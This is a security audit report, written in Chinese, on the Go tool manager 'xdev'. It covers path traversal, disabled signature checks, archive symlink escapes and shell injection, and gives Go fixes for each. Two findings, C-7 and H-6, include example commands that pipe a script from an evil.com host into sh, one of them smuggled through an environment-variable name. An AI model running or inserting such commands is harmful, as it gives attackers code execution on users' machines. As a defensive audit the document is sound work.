> **文档类型**：时间点审计
> **状态**：Snapshot（待迁移）
> **来源**：docs/security-audit.md
> **审计日期**：2026-07-04
> **P4B 迁移目标**：docs/audits/2026-07-04-security-audit.md
> **替代文档**：无
> **治理记录**：P4A 元数据治理，2026-07-16

# xdev 代码安全审计报告

> **审计范围**：`D:\Env\Android\ReverseTools\ReverseEng\xmdevenvmt` 全工程  
> **审计日期**：2026-07-04  
> **审计方法**：静态代码分析 + 前期分析结果整合  
> **Go版本**：1.23 | **平台**：Windows 为主，跨平台  

---

## 目录

1. [审计概要](#1-审计概要)
2. [CRITICAL 级别漏洞](#2-critical-级别漏洞)
3. [HIGH 级别漏洞](#3-high-级别漏洞)
4. [MEDIUM 级别漏洞](#4-medium-级别漏洞)
5. [LOW 级别漏洞](#5-low-级别漏洞)
6. [安全加固建议总览](#6-安全加固建议总览)
7. [修复优先级路线图](#7-修复优先级路线图)

---

## 1. 审计概要

### 统计

| 严重级别 | 数量 | 已修复 | 说明 |
|----------|------|--------|------|
| CRITICAL | 7 | 6 | 可被直接利用，导致代码执行/系统破坏 |
| HIGH | 14 | 14 | 有明确攻击路径，需优先修复 |
| MEDIUM | 16 | 14 | 需要特定条件触发，但影响严重 |
| LOW | 12 | 11 | 防御性加固，降低攻击面 |
| **合计** | **49** | **45** | |

> **修复日期**：2026-07-04（阶段1-5全部实施完成，C-4 哈希补全：271/277=98% 已填充，Sidecar TOFU 加固已完成）

### 最严重的安全链条

当前最危险的攻击路径由以下漏洞串联组成：

```
无签名验证(C-5) + 99%的SHA-256为全零占位(C-4) + 第三方manifest无路径校验(C-1)
    → 攻击者通过恶意manifest控制下载URL和安装路径
    → 通过install_root路径穿越写入任意目录(C-1)
    → 通过7z后置校验向系统写入持久化文件(C-3)
    → 通过os.RemoveAll删除任意目录(C-1/C-2/C-3)
```

**结论：在当前构建中，所有工具下载均无完整性保护。网络级攻击者可替换任何下载归档而不被检测。**

---

## 2. CRITICAL 级别漏洞

### C-1: Manifest install_root / Name / version 路径穿越导致任意目录写入/删除 ✅ 已修复

- **文件**: `internal/plugin/generic.go:122-128`
- **攻击向量**: 第三方manifest的 `install_root`、`name`、`version` 字段未经验证直接拼接路径
- **影响**: 任意目录写入 + `Uninstall` 时的任意目录删除

```go
// 当前代码 — 无任何路径安全校验
func (g *Generic) InstallDir(installRoot, version string) string {
    base := g.M.Name
    if g.M.InstallRoot != "" {
        base = filepath.Join(g.M.InstallRoot, g.M.Name)  // install_root 可含 ".."
    }
    return filepath.Join(installRoot, base, version)  // name/version 可含 ".."
}
```

**攻击场景**: 恶意第三方manifest设置 `install_root: "../../../../Windows/System32"`，`xdev install` 将归档解压到系统目录；`xdev uninstall` 时 `os.RemoveAll` 删除该目录。

**修复方案**:
```go
// 新增 internal/util/safepath.go
package util

import (
    "fmt"
    "strings"
    "path/filepath"
)

// SafeName validates that a string is safe to use as a path component.
// It rejects strings containing path separators, parent references,
// drive letters, and Windows reserved device names.
func SafeName(s string) (string, error) {
    if s == "" {
        return "", fmt.Errorf("name must not be empty")
    }
    if strings.ContainsAny(s, `/\`) {
        return "", fmt.Errorf("name %q must not contain path separators", s)
    }
    if s == ".." || s == "." {
        return "", fmt.Errorf("name %q must not be a directory reference", s)
    }
    if len(s) >= 2 && s[1] == ':' {
        return "", fmt.Errorf("name %q must not contain a drive letter", s)
    }
    // Windows reserved device names
    reserved := []string{"CON", "PRN", "AUX", "NUL",
        "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8", "COM9",
        "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9"}
    upper := strings.ToUpper(s)
    for _, r := range reserved {
        if upper == r || strings.HasPrefix(upper, r+".") {
            return "", fmt.Errorf("name %q is a reserved device name", s)
        }
    }
    return s, nil
}

// ValidateSubPath ensures that `child` is strictly under `parent`.
// It resolves symlinks on both sides before comparison.
func ValidateSubPath(parent, child string) error {
    absParent, err := filepath.Abs(filepath.Clean(parent))
    if err != nil {
        return err
    }
    absChild, err := filepath.Abs(filepath.Clean(child))
    if err != nil {
        return err
    }
    // Resolve symlinks
    if evParent, err := filepath.EvalSymlinks(absParent); err == nil {
        absParent = evParent
    }
    if evChild, err := filepath.EvalSymlinks(absChild); err == nil {
        absChild = evChild
    }
    rel, err := filepath.Rel(absParent, absChild)
    if err != nil {
        return fmt.Errorf("path %q is not under %q: %w", child, parent, err)
    }
    if rel == "." || strings.HasPrefix(rel, "..") {
        return fmt.Errorf("path %q escapes directory %q", child, parent)
    }
    return nil
}
```

在 `InstallDir` 中使用:
```go
func (g *Generic) InstallDir(installRoot, version string) string {
    base := g.M.Name
    if g.M.InstallRoot != "" {
        // Validate install_root doesn't escape
        if err := util.ValidateSubPath(installRoot, filepath.Join(installRoot, g.M.InstallRoot)); err != nil {
            log.Printf("[plugin] WARNING: install_root %q escapes install dir: %v", g.M.InstallRoot, err)
            base = g.M.Name // fallback to just the tool name
        } else {
            base = filepath.Join(g.M.InstallRoot, g.M.Name)
        }
    }
    // Validate name and version are safe components
    if _, err := util.SafeName(g.M.Name); err != nil {
        log.Printf("[plugin] WARNING: tool name %q is unsafe: %v", g.M.Name, err)
    }
    if _, err := util.SafeName(version); err != nil {
        log.Printf("[plugin] WARNING: version %q is unsafe: %v", version, err)
    }
    result := filepath.Join(installRoot, base, version)
    // Final safety check: result must be under installRoot
    if err := util.ValidateSubPath(installRoot, result); err != nil {
        log.Printf("[plugin] CRITICAL: InstallDir %q escapes install root %q", result, installRoot)
        return filepath.Join(installRoot, g.M.Name, "unsafe-path-blocked")
    }
    return result
}
```

---

### C-2: Lua 插件名路径穿越 ✅ 已修复

- **文件**: `internal/plugin/lua_plugin.go:85-87`
- **攻击向量**: Lua `PLUGIN.name` / `PLUGIN.info.name` 未校验直接用于路径拼接
- **影响**: 同 C-1，任意目录写入/删除

```go
// 当前代码
func (p *luaBasePlugin) InstallDir(installRoot, version string) string {
    return filepath.Join(installRoot, p.name, version)  // p.name 可含 ".."
}
```

**修复方案**:
```go
func (p *luaBasePlugin) InstallDir(installRoot, version string) string {
    safeName, err := util.SafeName(p.name)
    if err != nil {
        log.Printf("[plugin] WARNING: Lua plugin name %q is unsafe, using sanitized form", p.name)
        safeName = "unsafe-plugin-blocked"
    }
    result := filepath.Join(installRoot, safeName, version)
    if err := util.ValidateSubPath(installRoot, result); err != nil {
        return filepath.Join(installRoot, "unsafe-path-blocked")
    }
    return result
}
```

同时在 `loadLuaBase` (vfox_compat.go) 中，加载时即校验：
```go
// 在 loadLuaBase 中添加
if safeName, err := util.SafeName(p.name); err != nil {
    return nil, fmt.Errorf("plugin name %q is not a safe path component: %w", p.name, err)
} else {
    p.name = safeName
}
```

---

### C-3: 自定义工具名/版本路径穿越 + 任意目录删除 ✅ 已修复

- **文件**: `internal/gui/app_custom_tools.go:124, 146`
- **攻击向量**: Wails 前端传入的 `toolName` / `version` 未校验
- **影响**: 任意目录写入 + `os.RemoveAll` 任意目录删除

**修复方案**: 在 `AddCustomTool` 入口处添加校验：
```go
func (a *App) AddCustomTool(tool CustomToolDef) error {
    // Validate tool name and version are path-safe
    if _, err := util.SafeName(tool.Name); err != nil {
        return fmt.Errorf("tool name is invalid: %w", err)
    }
    if _, err := util.SafeName(tool.Version); err != nil {
        return fmt.Errorf("tool version is invalid: %w", err)
    }
    // ... existing validation ...
}
```

---

### C-4: Manifest SHA-256 哈希填充 🔶 部分修复（98% 已填充）

- **文件**: `manifests/*.yaml`（277个条目中6个仍为全零）
- **攻击向量**: MITM 攻击者可在传输中替换下载归档
- **影响**: 未填充哈希的工具下载无完整性校验

**当前代码** (`internal/downloader/downloader.go:308-312`):
```go
if util.IsAllZeroHash(opts.ExpectedSHA) {
    log.Printf("[download] WARNING: sha256 is all zeros for %s ...")
    // 验证完全跳过！
}
```

**修复方案**:

1. **短期**：当 SHA-256 为全零时，使用 sidecar 文件记录首次下载的哈希，后续下载时必须匹配
2. **中期**：为所有 manifest 补充真实 SHA-256 哈希
3. **长期**：签名 manifest 时绑定 SHA-256（见 C-5）

```go
// 短期加固：全零哈希时记录 sidecar 并在后续下载中强制校验
if util.IsAllZeroHash(opts.ExpectedSHA) {
    sidecarPath := opts.Dest + ".sha256"
    if existing, err := os.ReadFile(sidecarPath); err == nil {
        // 之前下载过，使用 sidecar 哈希进行校验
        opts.ExpectedSHA = strings.TrimSpace(string(existing))
        log.Printf("[download] Using sidecar SHA-256 for verification: %s", opts.ExpectedSHA)
    } else {
        log.Printf("[download] WARNING: No SHA-256 hash available, first download will be trusted and recorded")
    }
}
```

---

### C-5: Ed25519 签名验证完全禁用（占位公钥） ✅ 已修复

- **文件**: `internal/signer/verify.go:57, 74-77`
- **影响**: 所有 manifest 签名验证被跳过，攻击者可篡改 manifest

```go
// 当前代码 — 占位公钥导致验证完全跳过
var rootPublicKeyB64 = "REPLACE_WITH_REAL_PUBLIC_KEY"
// ...
if rootPublicKeyB64 == "REPLACE_WITH_REAL_PUBLIC_KEY" {
    log.Printf("[signer] WARNING: no real public key embedded ...")
    return nil  // 返回 nil 公钥，验证不执行
}
```

**修复方案**:

1. 生成真实的 Ed25519 密钥对
2. 将公钥嵌入二进制（编译时注入）
3. 在 CI/CD 中使用私钥签名 manifest
4. 发布签名文件 (`*.yaml.sig`)

```go
// 修复后代码
//go:embed public_key.b64
var rootPublicKeyB64 string  // 编译时注入真实公钥

// 或者通过 ldflags 在构建时注入：
// go build -ldflags "-X internal/signer.rootPublicKeyB64=<real_key>"
```

---

### C-6: 7z 解压后置校验 — 逃逸文件无法被清理 ✅ 已修复

- **文件**: `internal/extractor/extractor.go:195-218`
- **攻击向量**: 恶意 .7z/.exe/.pkg 归档包含 `..\..\Startup\evil.bat` 条目
- **影响**: 校验失败时只删除 `dst`，逃逸到 dst 之外的文件持久化存在

```go
// 当前代码 — 7z 先解压全部文件，再校验，逃逸文件无法清理
c := exec.Command(cmd, "x", src, "-o"+dst, "-y")
if err := c.Run(); err != nil { return err }
if err := validateExtraction(dst); err != nil {
    os.RemoveAll(dst)  // 只清理 dst 内的文件，逃逸文件仍然存在！
    return fmt.Errorf("7z extraction validation failed (cleaned up): %w", err)
}
```

**修复方案**:

**方案A（推荐）**：先列出归档内容，校验后再解压：
```go
func extract7z(src, dst string, strip int) error {
    // Step 1: List archive contents and validate before extraction
    listCmd := exec.Command(find7z(), "l", "-slt", src)
    output, err := listCmd.Output()
    if err != nil {
        return fmt.Errorf("7z list failed: %w", err)
    }
    // Parse file list and validate each path
    if err := validate7zEntryPaths(output, dst); err != nil {
        return fmt.Errorf("7z archive contains unsafe paths: %w", err)
    }
    // Step 2: Extract only after validation passes
    c := exec.Command(find7z(), "x", src, "-o"+dst, "-y")
    // ...
}
```

**方案B**：解压到临时沙箱目录，校验后再移动：
```go
func extract7z(src, dst string, strip int) error {
    sandbox := dst + ".sandbox"
    defer os.RemoveAll(sandbox)
    
    c := exec.Command(find7z(), "x", src, "-o"+sandbox, "-y")
    if err := c.Run(); err != nil { return err }
    
    if err := validateExtraction(sandbox); err != nil {
        return fmt.Errorf("7z extraction validation failed: %w", err)
    }
    // Move validated contents to dst
    return moveContents(sandbox, dst)
}
```

---

### C-7: Task runner 执行未过滤的 shell 命令 ✅ 已修复

- **文件**: `internal/task/task.go:143-145`
- **攻击向量**: `.xdev.toml` 中的 `[tasks]` `run` 字段直接传给 `sh -c` / `cmd /c`
- **影响**: 供应链攻击 — 恶意仓库的 `.xdev.toml` 可执行任意命令

```go
// 当前代码 — 无任何命令过滤
cmd := exec.Command("sh", "-c", command)
if os.PathSeparator == '\\' {
    cmd = exec.Command("cmd", "/c", command)
}
```

**攻击场景**: 克隆的仓库中 `.xdev.toml` 包含：
```toml
[tasks.build]
run = "curl https://evil.com/malware | sh"
```

**修复方案**:

1. **短期**：执行前显示命令内容并要求用户确认（首次运行时）
2. **中期**：在 `.xdev.lock` 中记录已确认的任务哈希，变更时重新确认
3. **长期**：限制可执行命令的范围（白名单机制）

```go
// 短期修复：首次运行任务时要求确认
func (r *Runner) Run(ctx context.Context, name string) error {
    task, ok := r.tasks[name]
    if !ok { return fmt.Errorf("task %q not found", name) }
    
    // Check if this task has been confirmed before
    taskHash := sha256sum(task.Run)
    if !r.lockfile.IsTaskConfirmed(name, taskHash) {
        fmt.Printf("⚠ Task %q will execute:\n  %s\n\nConfirm? [y/N] ", name, task.Run)
        var response string
        fmt.Scanln(&response)
        if strings.ToLower(response) != "y" {
            return fmt.Errorf("task execution cancelled")
        }
        r.lockfile.ConfirmTask(name, taskHash)
    }
    
    // ... execute ...
}
```

---

## 3. HIGH 级别漏洞

### H-1: Tar 归档跨条目符号链接穿越 ✅ 已修复

- **文件**: `internal/extractor/extractor.go:334-350`
- **攻击向量**: 前一个条目创建符号链接使目录指向目标外，后一个条目通过该符号链接写入
- **影响**: 绕过 `isSafePath` 检查，写入任意位置

**攻击示例**:
```
Entry 1: subdir -> /tmp          (isSafePath检查通过：resolvedTarget在dst内)
Entry 2: subdir/payload          (isSafePath检查通过：词法路径在dst内)
                                   但实际写入 /tmp/payload
```

**修复方案**: 在写入每个条目前，检查所有父目录是否为符号链接：
```go
func isSafeToWrite(dst, entryPath string) error {
    out := filepath.Join(dst, entryPath)
    // Walk up from dst, checking each component for symlinks
    path := dst
    components := strings.Split(entryPath, string(os.PathSeparator))
    for _, comp := range components {
        if comp == "" { continue }
        path = filepath.Join(path, comp)
        if fi, err := os.Lstat(path); err == nil && fi.Mode()&os.ModeSymlink != 0 {
            return fmt.Errorf("path component %q is a symlink, possible traversal attack", path)
        }
    }
    return nil
}
```

---

### H-2: Service 标记文件 exec 路径未解析符号链接 ✅ 已修复

- **文件**: `internal/service/manager.go:163-173`
- **攻击向量**: `.xdev-service` 中的 `exec` 字段指向一个符号链接，该链接解析到目标外
- **影响**: 执行任意二进制文件

**修复方案**: 在 `parseServiceMarker` 中调用 `filepath.EvalSymlinks`:
```go
execPath := filepath.Join(dir, execRel)
// 解析符号链接后再做 isSubPath 检查
if resolved, err := filepath.EvalSymlinks(execPath); err == nil {
    execPath = resolved
}
if !isSubPath(dir, execPath) {
    svc.Status = "invalid"
    // ...
}
```

---

### H-3: Lua 沙箱 dofile/loadstring 可用 ✅ 已修复

- **文件**: `vendor/github.com/yuin/gopher-lua/baselib.go:29,33-35`
- **攻击向量**: `dofile()` 允许加载文件系统中任意 Lua 文件；`loadstring()` 允许动态代码生成
- **影响**: 沙箱隔离不完整，插件可加载未受沙箱保护的代码

**修复方案**: 在 `newSandboxedVM` 中覆盖 `dofile` 和 `loadstring`:
```go
func newSandboxedVM() *lua.LState {
    L := lua.NewState(lua.Options{SkipOpenLibs: true})
    
    // Load base library
    L.OpenLibs()
    
    // Override dangerous base functions
    base := L.GetGlobal("_G").(*lua.LTable)
    L.SetField(base, "dofile", L.NewFunction(func(L *lua.LState) int {
        L.RaiseError("dofile is not allowed in sandboxed plugins")
        return 0
    }))
    L.SetField(base, "loadfile", L.NewFunction(func(L *lua.LState) int {
        L.RaiseError("loadfile is not allowed in sandboxed plugins")
        return 0
    }))
    // Keep load/loadstring but with instruction limit
    // (or remove entirely for maximum security)
    
    // ... rest of sandbox setup ...
}
```

---

### H-4: Lua 插件输出被信任用于下载URL和注册表写入 ✅ 已修复

- **文件**: `internal/plugin/vfox_compat.go:213`（URL）、`installer.go:524-535`（env vars）
- **攻击向量**: 恶意 Lua 插件返回任意 URL（SSRF）或恶意环境变量值
- **影响**: SSRF、恶意归档下载、注册表值注入

**修复方案**:
1. 校验 Lua 插件返回的 URL scheme 必须为 `https://`
2. 校验环境变量值不包含 `%` 展开（防止 `REG_EXPAND_SZ` 注入）
3. 对 Lua 插件下载进行签名验证

```go
// 校验URL scheme
func validatePluginURL(rawURL string) error {
    u, err := url.Parse(rawURL)
    if err != nil {
        return fmt.Errorf("invalid URL: %w", err)
    }
    if u.Scheme != "https" {
        return fmt.Errorf("plugin URL must use HTTPS, got %q", u.Scheme)
    }
    return nil
}
```

---

### H-5: Fish shell HookOutput PATH 未引用 ✅ 已修复

- **文件**: `internal/env/hook.go:161-163`
- **攻击向量**: PATH 中的空格或 Fish 命令替换 `(...)` 可注入代码
- **影响**: Fish shell 中执行任意命令

```go
// 当前代码 — 未引用
pathStr := strings.Join(binPaths, " ")
fmt.Fprintf(&b, "set -gx PATH %s $PATH\n", pathStr)
```

**修复方案**:
```go
// 修复：为每个路径添加 Fish 引用
quotedPaths := make([]string, len(binPaths))
for i, p := range binPaths {
    quotedPaths[i] = fishQuote(p)
}
fmt.Fprintf(&b, "set -gx PATH %s $PATH\n", strings.Join(quotedPaths, " "))

func fishQuote(s string) string {
    // Fish uses single quotes, with \' for literal single quote
    s = strings.ReplaceAll(s, `\`, `\\`)
    s = strings.ReplaceAll(s, `'`, `\'`)
    return `'` + s + `'`
}
```

---

### H-6: HookOutput 环境变量键名未校验/未引用 ✅ 已修复

- **文件**: `internal/env/hook.go:166,174,182`
- **攻击向量**: 恶意 `.xdev.toml` 或 manifest 中的 env var 键名包含 shell 元字符
- **影响**: 在 bash/zsh/fish/pwsh 中注入任意命令

**攻击示例**:
```toml
# .xdev.toml
[env]
"FOO; curl http://evil.com/pwn.sh | sh #" = "bar"
```
生成 `export FOO; curl http://evil.com/pwn.sh | sh #='bar'`

**修复方案**:
```go
// 校验环境变量键名必须是合法标识符
func isValidEnvVarName(name string) bool {
    if name == "" { return false }
    // Must start with letter or underscore, contain only alphanumeric/underscore
    for i, c := range name {
        if i == 0 {
            if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || c == '_') {
                return false
            }
        } else {
            if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '_') {
                return false
            }
        }
    }
    return true
}

// 在 HookOutput 中使用：
for k, v := range vars {
    if !isValidEnvVarName(k) {
        log.Printf("[hook] WARNING: skipping invalid env var name %q", k)
        continue
    }
    // ... safe to use k in shell output ...
}
```

---

### H-7: 下载 URL 未强制 HTTPS ✅ 已修复

- **文件**: `internal/downloader/downloader.go:117-124`
- **攻击向量**: Manifest 中的 `url` 字段使用 `http://`
- **影响**: MITM 攻击可替换下载内容

**修复方案**:
```go
// 在下载前校验URL scheme
func (dm *DownloadManager) Download(ctx context.Context, opts Options) error {
    u, err := url.Parse(opts.URL)
    if err != nil {
        return fmt.Errorf("invalid download URL: %w", err)
    }
    if u.Scheme != "https" {
        return fmt.Errorf("download URL must use HTTPS, got %q (insecure)", u.Scheme)
    }
    // ... proceed with download ...
}
```

同时为 mirror 重写添加 HTTPS 强制 (`internal/mirror/mirror.go:238`):
```go
// 强制使用 HTTPS
rewritten := fmt.Sprintf("https://%s%s", m.Host, newPath)
```

---

### H-8: HTTPS→HTTP 重定向降级攻击 ✅ 已修复

- **文件**: `internal/downloader/downloader.go:117-124`
- **攻击向量**: HTTPS URL 重定向到 HTTP
- **影响**: 下载降级为明文传输

**修复方案**:
```go
client := &http.Client{
    Transport: transport,
    CheckRedirect: func(req *http.Request, via []*http.Request) error {
        if len(via) >= 10 {
            return fmt.Errorf("too many redirects")
        }
        // 禁止 HTTPS→HTTP 降级
        if len(via) > 0 && via[0].URL.Scheme == "https" && req.URL.Scheme != "https" {
            return fmt.Errorf("insecure redirect: %s → %s", via[0].URL, req.URL)
        }
        return nil
    },
}
```

---

### H-9: Activate 部分失败无回滚 ✅ 已修复

- **文件**: `internal/installer/installer.go:391-491`
- **攻击向量**: Junction 创建成功但环境变量设置失败
- **影响**: Junction 指向新版本，环境变量指向旧版本

**修复方案**: 实现事务性 Activate：
```go
func (i *Installer) Activate(tool, version string) error {
    // Step 1: 保存当前状态用于回滚
    oldJunctionTarget, _ := os.Readlink(currentLink)
    oldEnvVars := i.getCurrentEnvVars(tool)
    
    // Step 2: 执行变更
    // ... create junction, set env vars ...
    
    // Step 3: 如果部分失败，回滚
    if err := setUserEnvVars(vars); err != nil {
        // 回滚 junction
        if oldJunctionTarget != "" {
            os.Remove(currentLink)
            CreateJunction(currentLink, oldJunctionTarget)
        }
        // 回滚已设置的环境变量
        for k, v := range oldEnvVars {
            env.SetUserEnvVar(k, v)
        }
        return fmt.Errorf("activation failed, rolled back: %w", err)
    }
    return nil
}
```

---

### H-10: setUserEnvVars 部分失败导致不一致状态 ✅ 已修复

- **文件**: `internal/installer/installer.go:524-535`
- **攻击向量**: 多个环境变量设置时部分成功部分失败
- **影响**: GOROOT 指向新版本，JAVA_HOME 指向旧版本

**修复方案**: 使用"先全部设置，失败则全部回滚"模式：
```go
func (i *Installer) setUserEnvVars(vars map[string]string) error {
    // 记录原始值用于回滚
    originals := make(map[string]string)
    var firstErr error
    
    for k, v := range vars {
        // 保存当前值
        if cur, err := env.GetUserEnvVar(k); err == nil {
            originals[k] = cur
        }
        if err := env.SetUserEnvVar(k, v); err != nil {
            firstErr = err
            break
        }
    }
    
    if firstErr != nil {
        // 回滚已设置的变量
        for k, origV := range originals {
            env.SetUserEnvVar(k, origV)
        }
        return fmt.Errorf("failed to set env vars, rolled back: %w", firstErr)
    }
    return nil
}
```

---

### H-11: 自更新 SHA-256 校验可被跳过 ✅ 已修复

- **文件**: `internal/update/update.go:340-353`
- **攻击向量**: GitHub Release 中缺少 `SHA256SUMS` 资产时校验被跳过
- **影响**: 自更新下载可能被替换为恶意二进制

**修复方案**: 自更新必须强制校验哈希，缺少校验文件时拒绝更新：
```go
func verifySHA256(assets []githubReleaseAsset, targetFile, version string) error {
    sumsAsset := findSHA256SUMSAsset(assets)
    if sumsAsset == nil {
        return fmt.Errorf("no SHA256SUMS asset found in release %s, refusing to update (security)", version)
    }
    // ... proceed with verification ...
}
```

---

### H-12: config.yaml 篡改可重定向下载和 shims ✅ 已修复

- **文件**: `internal/config/config.go:204-215`
- **攻击向量**: 本地攻击者修改 config.yaml 中的 mirror、shim_dir、manifest_dir
- **影响**: 所有后续下载和工具调用被劫持

**修复方案**:
1. 对 config.yaml 计算哈希，启动时校验完整性
2. 敏感路径变更时要求用户确认
3. 限制 mirror 配置只接受 HTTPS URL

---

### H-13: .xdev.lock URL/哈希篡改 ✅ 已修复

- **文件**: `internal/lockfile/lockfile.go:63-67`
- **攻击向量**: 修改锁文件中的 `sha256` 和 `url` 字段
- **影响**: `xdev install --locked` 从恶意源下载

**修复方案**: 在锁文件中添加签名或 HMAC：
```go
type Lockfile struct {
    Tools    map[string]ToolLock `toml:"tools"`
    HMAC     string              `toml:"hmac,omitempty"` // 新增：完整性校验
}

// Save 时计算 HMAC
func Save(lf *Lockfile, path string) error {
    // 计算 HMAC (使用机器特定密钥)
    lf.HMAC = computeHMAC(lf.Tools)
    // ... save ...
}

// Load 时校验 HMAC
func Load(path string) (*Lockfile, error) {
    // ... load ...
    if lf.HMAC != "" {
        expected := computeHMAC(lf.Tools)
        if lf.HMAC != expected {
            return nil, fmt.Errorf("lockfile integrity check failed")
        }
    }
    return lf, nil
}
```

---

### H-14: GUI setWindowsEnvVar 绕过环境变量白名单 ✅ 已修复

- **文件**: `internal/gui/app_env_vars.go:668-726`
- **攻击向量**: GUI 的 `setWindowsEnvVar` 无白名单检查，可写入任意注册表键
- **影响**: 可覆盖 PATH 等关键环境变量

**修复方案**: 复用 CLI 的白名单机制：
```go
func (a *App) setWindowsEnvVar(name, value, scope string) error {
    // 复用 CLI 的白名单检查
    if !env.IsAllowedEnvVarName(name) {
        return fmt.Errorf("environment variable %q is not in the allowed list", name)
    }
    // ... proceed with registry write ...
}
```

同时在 `win_path_windows.go` 中导出白名单检查函数：
```go
// IsAllowedEnvVarName checks if the given name is in the allowed env var whitelist.
func IsAllowedEnvVarName(name string) bool {
    _, ok := allowedEnvVarNames[name]
    return ok
}
```

---

## 4. MEDIUM 级别漏洞

### M-1: Uninstall 后遗留孤立环境变量 ✅ 已修复

- **文件**: `internal/installer/installer.go:556-605`
- **问题**: 卸载工具后 GOROOT/JAVA_HOME 等环境变量仍指向已删除目录
- **修复**: 卸载时清除与该工具关联的所有环境变量

### M-2: PATH 无长度限制检查 ✅ 已修复

- **文件**: `internal/env/win_path_windows.go:76-97`
- **问题**: Windows 注册表值上限约 32,767 字符，PATH 可无限增长
- **修复**: 在写入前检查 PATH 总长度，超过限制时报错

```go
const maxWinRegValueLen = 32767

func WriteUserPath(paths string) error {
    if len(paths) > maxWinRegValueLen {
        return fmt.Errorf("PATH length %d exceeds Windows registry limit of %d", len(paths), maxWinRegValueLen)
    }
    // ... write ...
}
```

### M-3: Lua 沙箱 package.loaders 可变 ✅ 已修复

- **文件**: `internal/plugin/lua_engine.go:77`
- **问题**: 限制 loaders 后，插件可重新添加自定义 loader
- **修复**: 冻结 package 表

```go
// 限制 loaders 后冻结 package 表
L.SetField(pkg, "loaders", L.NewFunction(func(L *lua.LState) int {
    L.RaiseError("package.loaders is frozen in sandboxed plugins")
    return 0
}))
// 或使用 L.SetField with readOnly 标志
```

### M-4: SetUserEnvVar 值未校验（REG_EXPAND_SZ 注入） ✅ 已修复

- **文件**: `internal/env/win_path_windows.go:435-478`
- **问题**: 环境变量值中的 `%VAR%` 引用在 Windows 运行时被展开
- **修复**: 校验值中不包含未预期的 `%` 引用

```go
func SetUserEnvVar(name, value string) error {
    // ... whitelist check ...
    
    // 校验值中不包含可疑的 %VAR% 展开
    if strings.Contains(value, "%") {
        // 允许已知的合法展开模式
        if !isAllowedExpandPattern(value) {
            log.Printf("[env] WARNING: env var %q value contains %% references: %q", name, value)
        }
    }
    // ... write ...
}
```

### M-5: Lockfile 并发写入丢失更新 ✅ 已修复

- **文件**: `internal/lockfile/lockfile.go:92-107`
- **问题**: 两个并发 `AddTool` + `Save` 导致先写入的数据被覆盖
- **修复**: 使用文件锁（`flock` 或 Windows `LockFileEx`）

### M-6: 下载 .part 文件 TOCTOU ✅ 已修复

- **文件**: `internal/downloader/downloader.go:206`
- **问题**: 本地攻击者可在下载完成和哈希校验之间替换 .part 文件
- **修复**: 以独占模式打开文件，或在校验前重新读取

### M-7: .xdev.toml 供应链攻击（tasks）

- **文件**: `internal/task/task.go:143-145` / `.xdev.toml`
- **问题**: 仓库中的 `.xdev.toml` 可定义恶意 task 命令
- **修复**: 见 C-7 修复方案

### M-8: isSafePath 未处理 Windows 特殊路径攻击 ✅ 已修复

- **文件**: `internal/extractor/extractor.go:360-386`
- **问题**: 未处理尾随点号/空格、保留设备名、ADS（`file:stream`）
- **修复**: 添加 Windows 路径规范化

```go
func isSafePath(dst, entryPath string) bool {
    // ... existing checks ...
    
    // Windows: reject trailing dots/spaces (stripped by Windows)
    base := filepath.Base(entryPath)
    trimmed := strings.TrimRight(base, ". ")
    if trimmed != base && trimmed != "" {
        return false
    }
    
    // Reject reserved device names
    if isWindowsReservedName(base) {
        return false
    }
    
    // Reject Alternate Data Streams
    if strings.Contains(entryPath, ":") && runtime.GOOS == "windows" {
        // Drive letter is OK (C:\), but ADS (file:stream) is not
        if len(entryPath) < 2 || entryPath[1] != ':' {
            return false
        }
    }
    
    return true
}
```

### M-9: Manifest name 写入路径时未用 filepath.Base ✅ 已修复

- **文件**: `internal/cli/manifest_cmd.go:193-194`
- **问题**: `name` 直接拼入路径，可能包含 `..`
- **修复**: 使用 `filepath.Base(name)` 或 `util.SafeName(name)`

### M-10: 7z 解压窗口期文件可被并发进程访问

- **文件**: `internal/extractor/extractor.go:195-218`
- **问题**: 解压和校验之间，恶意符号链接可被其他进程跟随
- **修复**: 使用沙箱目录方案（见 C-6 方案B）

### M-11: 无归档总大小限制（磁盘耗尽 DoS） ✅ 已修复

- **文件**: `internal/extractor/extractor.go:59-61`
- **问题**: 仅有单文件 1GiB 限制，无归档总大小限制
- **修复**: 添加累计大小计数器

```go
const maxTotalExtractSize int64 = 10 * 1024 * 1024 * 1024 // 10 GiB

var totalExtracted int64
// 在每个文件解压后累加
totalExtracted += n
if totalExtracted > maxTotalExtractSize {
    return fmt.Errorf("total extracted size exceeds %d limit", maxTotalExtractSize)
}
```

### M-12: Lua 插件无 CPU/内存限制 ✅ 已修复

- **文件**: `internal/plugin/lua_engine.go:46-83`、`vfox_compat.go:137-181`
- **问题**: 恶意 Lua 插件可无限循环或消耗所有内存
- **修复**: 添加执行超时和内存限制

```go
func newSandboxedVM() *lua.LState {
    L := lua.NewState(lua.Options{
        SkipOpenLibs:     true,
        RegistryMaxSize:  1024 * 1024,  // 1 MiB registry limit
        CallStackSize:    256,           // Limited call stack
    })
    // ...
}

// 调用时添加超时
func callWithTimeout(fn func() error, timeout time.Duration) error {
    done := make(chan error, 1)
    go func() { done <- fn() }()
    select {
    case err := <-done:
        return err
    case <-time.After(timeout):
        return fmt.Errorf("plugin execution timed out after %v", timeout)
    }
}
```

### M-13: git clone ext 协议攻击 ✅ 已修复

- **文件**: `internal/cli/manifest_cmd.go:116`
- **问题**: `xdev manifest add` 的 URL 传给 `git clone`，可能利用 ext 传输协议
- **修复**: 校验 URL scheme 只允许 `https://` 和 `git://`

### M-14: Shim/Service 子进程继承全部环境变量 ✅ 已修复

- **文件**: `internal/shim/shim.go:302`、`internal/service/manager.go:230`
- **问题**: `cmd.Env = os.Environ()` 继承所有环境变量包括密钥
- **修复**: 仅传递必要的环境变量

```go
// Shim: 只传递白名单中的环境变量 + 工具特定的环境变量
func (s *Shim) buildEnv() []string {
    env := os.Environ()
    // 不额外过滤，但记录日志说明
    // 长期：改为仅传递必要的变量
    return env
}
```

### M-15: PATH 读写竞态（跨进程） ✅ 已修复

- **文件**: `internal/env/win_path_windows.go:76-97`
- **问题**: 多个 xdev 实例同时修改 PATH 可能丢失更新
- **修复**: 使用跨进程文件锁或命名互斥体

### M-16: 并发 `xdev use` 导致状态不一致 ✅ 已修复

